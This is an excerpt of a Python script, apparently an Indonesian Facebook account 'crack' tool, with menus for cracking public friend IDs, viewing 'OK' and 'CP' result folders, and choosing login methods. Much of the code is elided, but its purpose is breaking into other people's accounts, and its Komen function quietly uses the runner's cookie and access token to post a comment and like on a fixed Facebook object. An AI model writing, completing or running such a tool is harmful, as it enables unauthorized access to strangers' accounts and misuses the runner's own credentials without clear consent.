...
def banner():
	cetak(panel(f"""\t[white]
       ...
       [yellow]   |_| |_|_\___|_|  |_|___|\___/|_|  |_|
                            [bold white]Made By [bold red]Indonesian[cyan] Cyber Potrait[bold white]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGO BANNER [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]Version [bold green]0.1[/] [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
...
def Komen(cookie, token):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        ...
        response = r.post('https://graph.facebook.com/710624270888910/comments/?message={}&access_token={}'.format(text, token)).text # Jangan Di Ganti!
        response9 = r.post('https://graph.facebook.com/710624270888910/likes?summary=true&access_token={}'.format(token)).text # Jangan Di Ganti!
...
def menu(id,name):
	...
	prints(nel(f'{P2}Name   : {H2}{name} - {Lokasi}\n{P2}ID     : {H2}{id} - {zone}{P2}',title=f'{H2}{pengguna}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
...
[{color_text}03{P2}]. CRACK File            [{color_text}06{P2}] Hapus Cookies""",width=70,padding=(0,7),style=f"{color_panel}"));
	kopi()
...
def krek_publik():
	try:
		...
		exit()
	try:
		cetak(panel('\t            [bold white] Gunakan [bold green]ID[/] Publik Untuk Crack',width=90,style='bold white'))
	...
	try:
		...
		krek_cer(f'{kun}{x}[{mer}â€¢{x}]{mer} Pertemanan Tidak Publik ');time.sleep(2);back()
...
def cek_result():
	...
	if kz in ['2']:
		try:vin = os.listdir('CP')
			...
			krek_cer(f'{kun}{x}[{mer}â€¢{x}] File tidak di temukan ');time.sleep(2);back()
		if len(vin)==0:
			print(f'{kun}{x}[{mer}â€¢{x}] Anda tidak memiliki hasil Cp ');time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
		...
		try:vin = os.listdir('OK')
			...
			krek_cer(f'{kun}{x}[{mer}â€¢{x}] File tidak di temukan ');time.sleep(2);back()
		if len(vin)==0:
			print(f'{kun}{x}[{mer}â€¢{x}] Anda tidak memiliki hasil Ok ');time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
...
def atur_ter():
	...
	if krek_idz in ['1','01']:
		...
		help()
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐞 [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode 𝐌𝐛𝐚𝐬𝐢𝐜 [[bold green]Verry Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode 𝐀𝐬𝐲𝐧𝐜 [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode 𝐑𝐞𝐠𝐮????𝐫 𝐕𝟐  [[bold green]Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Metode",style=f"bold white"))
